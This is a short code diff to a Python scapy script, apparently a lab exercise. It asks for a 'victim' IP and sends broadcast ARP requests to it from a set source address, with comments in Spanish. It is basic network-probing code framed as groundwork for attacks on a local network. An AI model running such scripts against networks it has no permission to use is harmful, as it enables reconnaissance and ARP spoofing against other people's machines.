@@ -2,13 +2,21 @@
 from scapy.all import *
 
 
+ip = input("Type the IP address of the victim: -> ")
+print("You are looking for the mac of this IP " + ip);
+
+
 packet = Ether()/ARP()
 packet.op = 1 #request
-packet.psrc="192.168.0.100" #victim
+packet.psrc="10.189.15.142" #IP DEL HOST
+
 packet.hwdst="ff:ff:ff:ff:ff:ff" # all victims
-packet.pdst = "255.255.255.255" # all victims
+
+packet.pdst = ip # IP DE LA VICTIMA
+
+#packet.pdst = "10.189.15.120" # IP DE LA VICTIMA
 packet.dst = "ff:ff:ff:ff:ff:ff" # all victims
 
-#sendp(packet, loop =1, inter = .2)
-
 packet.show()
+
+sendp(packet, loop =1, inter = .2, count = 3)
